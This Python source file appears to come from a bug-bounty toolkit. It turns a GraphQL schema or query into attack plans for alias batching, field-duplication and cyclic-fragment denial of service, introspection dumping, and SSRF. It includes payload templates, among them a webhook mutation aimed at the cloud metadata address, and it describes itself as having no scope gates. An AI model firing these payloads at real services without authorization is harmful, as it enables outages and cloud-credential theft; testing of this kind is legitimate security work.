#!/usr/bin/env python3
"""BugWolf GraphQL Batching & DoS Analyzer (P0, Week 2).

Introspection-derived operation inventory -> abuse plans for the GraphQL
attack surface that payload scanners miss:

  * batching / alias abuse (Nx batching to bypass rate limits / cost controls)
  * field-duplication DoS (repeating expensive fields)
  * circular-fragment / alias depth (deep or cyclic queries)
  * introspection exposure (schema dump, mutation discovery)
  * SSRF via URL-typed fields (fields whose type/args take URLs)

Design (deterministic core, uncensored, workflow-aware):

  * Deterministic: same schema + query => identical plans.
  * Offline by default: input is an introspection result (or a schema dict) or
    raw query text; the tool writes *plans* to
    ``recon/<target>/discovery/graphql-plans.json`` — a ``coverage-plan``
    artifact.  Live mutation/replay is the operator's step (pass-through
    execution layer).
  * Emits ``FINDING_DISCOVERED``-adjacent events on the signal bus via the
    ``GRAPHQL_CANDIDATE`` event when high-confidence candidates are found.
  * Uncensored: no scope/confirmation gates.

Usage:
  python3 tools/domains/api/graphql_batch_analyzer.py --target acme --introspection introspection.json
  python3 tools/domains/api/graphql_batch_analyzer.py --target acme --query 'query { user(id:1){ name } }'
  python3 tools/domains/api/graphql_batch_analyzer.py --target acme --json
"""

import json
import re
import sys
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

def _repo_root() -> Path:
    """Walk up from this module until the tools/ package root is found."""
    current = Path(__file__).resolve().parent
    while current != current.parent:
        if (current / "tools" / "runtime_paths.py").is_file():
            return current
        current = current.parent
    return current

_CODE_ROOT = _repo_root()
if str(_CODE_ROOT) not in sys.path:
    sys.path.insert(0, str(_CODE_ROOT))
from tools.runtime_paths import workspace_root

try:
    from tools.core.signal_bus import SignalBus
except ImportError:  # direct script execution
    from tools.core.signal_bus import SignalBus

SCHEMA = "bugwolf/graphql-analyzer/v1"
GRAPHQL_CANDIDATE = "GRAPHQL_CANDIDATE"  # published via signal bus

# GraphQL scalar / built-in types that never carry URLs.
_NON_URL_TYPES = {
    "id", "int", "float", "boolean", "string", "uuid", "datetime", "date",
    "time", "json", "jsonb", "bigint", "decimal", "byte", "binary", "ip",
}

# Field/arg names that commonly carry URLs (SSRF surface).
_URL_NAMES = re.compile(r"(?i)(url|uri|href|src|link|webhook|callback|endpoint|"
                        r"redirect|image_url|avatar|logo|icon|domain|host|fetch)")


@dataclass
class GraphqlPlan:
    plan_id: str
    category: str  # batching | field_duplication | fragment_depth | introspection | ssrf
    severity_hint: str
    description: str
    query_template: str
    observations: List[str]
    validation_steps: List[str]

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class GraphqlAnalysis:
    target: str
    generated_at: str
    endpoint: str
    plans: List[GraphqlPlan] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "schema": SCHEMA,
            "target": self.target,
            "generated_at": self.generated_at,
            "endpoint": self.endpoint,
            "plan_count": len(self.plans),
            "plans": [p.to_dict() for p in self.plans],
        }


def _id(prefix: str, *parts: str) -> str:
    import hashlib
    raw = "|".join(str(p).strip().lower() for p in parts)
    return prefix + "-" + hashlib.sha256(raw.encode()).hexdigest()[:12]


def _walk_types(schema: Dict[str, Any]) -> Dict[str, Dict[str, Any]]:
    """Build a {type_name: type_def} map from an introspection result."""
    types: Dict[str, Dict[str, Any]] = {}
    data = schema.get("data", schema)
    schema_types = data.get("__schema", {}).get("types", [])
    if not isinstance(schema_types, list):
        schema_types = data.get("types", [])
    for type_def in schema_types:
        if not isinstance(type_def, dict):
            continue
        name = type_def.get("name")
        if name and not name.startswith("__"):
            types[name] = type_def
    return types


def _named_type(type_ref: Any) -> str:
    """Resolve a GraphQL type reference to its named type."""
    if isinstance(type_ref, dict):
        if type_ref.get("kind") in ("NON_NULL", "LIST"):
            return _named_type(type_ref.get("ofType"))
        return str(type_ref.get("name") or "")
    return str(type_ref or "")


def _is_url_type(type_ref: Any, types: Dict[str, Dict[str, Any]]) -> bool:
    name = _named_type(type_ref).lower()
    if name in _NON_URL_TYPES:
        return False
    if _URL_NAMES.search(name):
        return True
    return False


def _field_url_type(field: Dict[str, Any], types: Dict[str, Dict[str, Any]]) -> bool:
    """A field is an SSRF surface if its name, type, or any arg is URL-ish.

    The arg/field *name* is the strongest signal: ``fetchPage(url:)`` has a
    String-typed arg but the name ``url`` marks it as a server-side fetch
    surface — the classic GraphQL SSRF (PortSwigger; aw-junaid methodology).
    """
    field_name = str(field.get("name") or "")
    if _URL_NAMES.search(field_name):
        return True
    if _is_url_type(field.get("type"), types):
        return True
    for arg in field.get("args", []) or []:
        if not isinstance(arg, dict):
            continue
        arg_name = str(arg.get("name") or "")
        if _URL_NAMES.search(arg_name) or _is_url_type(arg.get("type"), types):
            return True
    return False


def _introspection_plans(endpoint: str, schema: Dict[str, Any],
                         target: str) -> List[GraphqlPlan]:
    types = _walk_types(schema)
    plans: List[GraphqlPlan] = []
    operations: List[Dict[str, Any]] = []
    for name, type_def in sorted(types.items()):
        if type_def.get("kind") in ("OBJECT", "INPUT_OBJECT"):
            fields = type_def.get("fields", []) or []
            for fld in fields:
                if isinstance(fld, dict):
                    operations.append({"type": name, "field": fld})

    url_fields = [op for op in operations
                  if _field_url_type(op["field"], types)]

    # 1. Batching / alias abuse.
    if operations:
        plans.append(GraphqlPlan(
            plan_id=_id("gql-plan", target, endpoint, "batching"),
            category="batching",
            severity_hint="medium",
            description=(
                "Alias/batch abuse: GraphQL lets one HTTP request carry N "
                "copies of the same operation under distinct aliases.  If the "
                "server's cost/rate control counts requests instead of "
                "resolved fields, batching bypasses the limit."),
            query_template=(
                "query { "
                + " ".join(f"a{i}: op" for i in range(10)) + " }"),
            observations=[
                "Nx batching raises the per-request work without raising the "
                "request count (classic rate-limit bypass).",
                "Also test field-duplication within one operation (repeat the "
                "same expensive field 20-50x).",
            ],
            validation_steps=[
                "Send 1 request with 10 aliased copies of a cheap operation "
                "and observe whether the server resolves all 10.",
                "Compare response time / error behavior for a 1x vs 50x "
                "batched query on the most expensive resolvable field.",
                "If the server applies per-query cost analysis, batched "
                "queries should be rejected — record both behaviors.",
            ],
        ))

    # 2. Field-duplication DoS.
    plans.append(GraphqlPlan(
        plan_id=_id("gql-plan", target, endpoint, "field_dup"),
        category="field_duplication",
        severity_hint="medium",
        description=(
            "Field-duplication DoS: repeating an expensive resolver (or a "
            "nested list field) inside one query multiplies server work "
            "without a batching alias."),
        query_template="query { " + " ".join(["expensiveField"] * 20) + " }",
        observations=[
            "Deeply nested lists (friends { friends { ... } }) compound "
            "exponentially — the classic GraphQL DoS.",
            "Aliases do not de-duplicate: each alias resolves separately.",
        ],
        validation_steps=[
            "Replay a duplicated-field query with escalating counts and "
            "measure latency/server CPU without hammering (bounded probes).",
            "Check for a query-depth or cost limit; note if none exists.",
        ],
    ))

    # 3. Circular fragment / depth.
    plans.append(GraphqlPlan(
        plan_id=_id("gql-plan", target, endpoint, "fragment_depth"),
        category="fragment_depth",
        severity_hint="medium",
        description=(
            "Fragment/depth abuse: recursive fragments or deep nesting can "
            "exhaust the server's query parser/executor."),
        query_template=(
            "fragment Loop on Node { ... on User { friends { ...Loop } } } "
            "query { node { ...Loop } }"),
        observations=[
            "Cyclic fragments are rejected by spec-compliant servers but "
            "parser bugs still occur.",
            "Depth limits are the common mitigation; absence is a signal.",
        ],
        validation_steps=[
            "Probe a deeply nested (depth 30+) non-cyclic query and observe "
            "whether a depth limit exists.",
            "Attempt the cyclic fragment only if the depth probe shows no "
            "limit; bounded, non-destructive.",
        ],
    ))

    # 4. Introspection exposure.
    plans.append(GraphqlPlan(
        plan_id=_id("gql-plan", target, endpoint, "introspection"),
        category="introspection",
        severity_hint="low",
        description=(
            "Introspection exposure: if __schema is reachable, the full type "
            "graph (including mutations) is dumpable — the foundation for "
            "every other GraphQL finding."),
        query_template="query { __schema { types { name } } }",
        observations=[
            "50% of GraphQL endpoints are targeted with introspection "
            "attacks (Imperva research).",
            "Introspection also reveals mutation operations and URL-typed "
            "fields for the SSRF surface below.",
        ],
        validation_steps=[
            "Run the __schema query; if it returns types, record the dump "
            "into the surface model.",
            "Feed the dumped operations into the BFLA matrix (privileged "
            "mutations) and the batching plans above.",
        ],
    ))

    # 5. SSRF via URL-typed fields (from introspection).
    if url_fields:
        sample = ", ".join(f"{op['type']}.{op['field'].get('name')}"
                           for op in url_fields[:5])
        plans.append(GraphqlPlan(
            plan_id=_id("gql-plan", target, endpoint, "ssrf_url_field"),
            category="ssrf",
            severity_hint="high",
            description=(
                "SSRF via URL-typed fields: the schema exposes fields/args "
                "that take URLs (webhook/callback/avatar/fetch).  If the "
                "resolver fetches server-side without destination control, "
                "the URL arg is an SSRF surface."),
            query_template="mutation { setWebhook(url: \"http://169.254.169.254/latest/meta-data/\") { ok } }",
            observations=[
                "Detected URL-typed surface: " + sample,
                "Test with a collaborator/owned listener first, then "
                "cloud-metadata URLs only under operator authorization.",
            ],
            validation_steps=[
                "Send the URL to an operator-owned listener and confirm a "
                "server-side fetch (DNS/HTTP callback).",
                "If confirmed, probe internal destinations with explicit "
                "authorization; record the SSRF as a candidate.",
            ],
        ))

    return plans


def _query_plans(target: str, endpoint: str, query: str) -> List[GraphqlPlan]:
    """Plan from a raw query when no introspection result is available."""
    plans: List[GraphqlPlan] = []
    lowered = query.lower()

    alias_count = len(re.findall(r"(?<![\w:])[a-zA-Z_][\w]*\s*:", query))
    if alias_count >= 3:
        plans.append(GraphqlPlan(
            plan_id=_id("gql-plan", target, endpoint, "query_batching"),
            category="batching",
            severity_hint="medium",
            description="The supplied query already uses aliases — a batching "
                        "pattern that may bypass per-request rate limits.",
            query_template=query,
            observations=[f"{alias_count} alias(es) detected in the query."],
            validation_steps=[
                "Replay the query as-is and compare per-field resolution cost "
                "to a single-field baseline.",
                "Escalate Nx if the server shows no cost analysis.",
            ],
        ))

    if "__schema" in lowered or "__type" in lowered:
        plans.append(GraphqlPlan(
            plan_id=_id("gql-plan", target, endpoint, "query_introspection"),
            category="introspection",
            severity_hint="low",
            description="The query references introspection — check whether "
                        "the endpoint exposes __schema.",
            query_template=query,
            observations=["Introspection enables schema-driven attack planning."],
            validation_steps=[
                "Run __schema and feed operations into the BFLA matrix.",
            ],
        ))

    if _URL_NAMES.search(query) and re.search(r"(?i)\burl|webhook|callback|redirect|fetch|href|src\b", query):
        plans.append(GraphqlPlan(
            plan_id=_id("gql-plan", target, endpoint, "query_ssrf"),
            category="ssrf",
            severity_hint="high",
            description="The query passes a URL-like value to a field/arg — "
                        "a potential SSRF surface if resolved server-side.",
            query_template=query,
            observations=["Confirm with an operator-owned callback listener first."],
            validation_steps=[
                "Point the URL at an owned listener; confirm server-side fetch.",
                "Only under authorization probe internal destinations.",
            ],
        ))

    return plans


def analyze(target: str, *, introspection: Optional[Dict[str, Any]] = None,
            query: str = "", endpoint: str = "") -> GraphqlAnalysis:
    """Deterministically build the GraphQL abuse plan set."""
    endpoint = endpoint or "graphql"
    plans: List[GraphqlPlan] = []
    if introspection:
        plans.extend(_introspection_plans(endpoint, introspection, target))
    if query:
        plans.extend(_query_plans(target, endpoint, query))
    return GraphqlAnalysis(target=target,
                           generated_at=datetime.now(timezone.utc).isoformat(),
                           endpoint=endpoint, plans=plans)


def write_analysis(analysis: GraphqlAnalysis, *, project_root: Optional[str] = None,
                   base_dir: Optional[str] = None) -> Path:
    """Persist to recon/<target>/discovery/graphql-plans.json (coverage-plan input)."""
    if base_dir:
        root = Path(base_dir)
    else:
        root = workspace_root(project_root)
    target_slug = re.sub(r"[^\w.-]+", "_", analysis.target) or "default"
    out_dir = root / "recon" / target_slug / "discovery"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / "graphql-plans.json"
    out_path.write_text(json.dumps(analysis.to_dict(), indent=2) + "\n",
                        encoding="utf-8")
    return out_path


def main() -> int:
    import argparse
    parser = argparse.ArgumentParser(
        description="BugWolf GraphQL Batching & DoS Analyzer (P0)")
    parser.add_argument("--target", required=True, help="Target name")
    parser.add_argument("--introspection", default="",
                        help="Path to an introspection JSON result")
    parser.add_argument("--query", default="", help="Raw GraphQL query text")
    parser.add_argument("--endpoint", default="graphql",
                        help="GraphQL endpoint path (default: graphql)")
    parser.add_argument("--project-root", default=None,
                        help="Workspace root (default: cwd)")
    parser.add_argument("--json", action="store_true", help="Emit strict JSON")
    args = parser.parse_args()

    introspection = None
    if args.introspection:
        try:
            introspection = json.loads(
                Path(args.introspection).read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError) as exc:
            print(json.dumps({"ok": False,
                              "error": f"invalid introspection JSON: {exc}"},
                             indent=2))
            return 2

    analysis = analyze(args.target, introspection=introspection,
                       query=args.query, endpoint=args.endpoint)
    out_path = write_analysis(analysis, project_root=args.project_root)

    if analysis.plans:
        try:
            bus = SignalBus(args.target, project_root=args.project_root)
            for plan in analysis.plans:
                if plan.severity_hint == "high":
                    bus.publish(GRAPHQL_CANDIDATE, source="graphql_batch_analyzer",
                                payload={"category": plan.category,
                                         "endpoint": analysis.endpoint,
                                         "description": plan.description[:300]})
        except Exception:
            pass  # event bus is advisory

    output = {
        "schema": SCHEMA,
        "ok": True,
        "target": args.target,
        "endpoint": analysis.endpoint,
        "plan_count": len(analysis.plans),
        "categories": sorted({p.category for p in analysis.plans}),
        "output_file": str(out_path),
        "plans": [p.to_dict() for p in analysis.plans],
    }
    print(json.dumps(output, indent=2) if args.json else
          f"[+] {args.target}: {len(analysis.plans)} GraphQL plans "
          f"({', '.join(output['categories'])}) -> {out_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
